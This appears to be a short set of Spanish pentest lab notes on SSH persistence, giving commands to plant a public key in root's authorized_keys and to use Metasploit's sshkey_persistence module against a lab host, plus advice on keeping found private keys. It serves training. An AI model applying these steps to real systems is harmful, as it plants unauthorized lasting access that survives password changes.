Clave RSA

Añadir claves SSH a authorized_keys permite mantener acceso sin contraseña. Es una técnica de persistencia que debe documentarse y revertirse tras la práctica o pentest.

Manual

Kali: Creamos un par de claves

ssh-keygen # INTRO, INTRO
# Leemos la clave pública, quitamos saltos de línea, copiamos output al clipboard
cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip

Bash pwneada y como root: Pegamos la clave creada anteriormente

cd /root/.ssh
nano authorized_keys

Kali: Nos conectamos a la víctima

ssh root@<ip_target>

Metasploit

Comandos

# Desde Metasploit si tenemos una sesión como root abierta, podemos crear un par de claves rsa y guardarnos la clave privada para conectarnos siempre que queramos
use post/linux/manage/sshkey_persistence
set SESSION 4
set CREATESSHFOLDER true
exploit

SSH Private Key: /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt

Comandos

# Nos copiamos el archivo en nuestra máquina Kali
cp  /root/.msf4/loot/..._id_rsa_606834.txt ssh_key
# Cambiamos los permisos, si no ssh descarta la clave priv
chmod 0400 ssh_key
# Nos conectamos
ssh -i ssh_key root@demo.ine.local

Nota: Del mismo modo, si nos encontramos una clave privada, nos la podemos guardar y tener acceso al sistema aunque el usuario cambie de contraseña
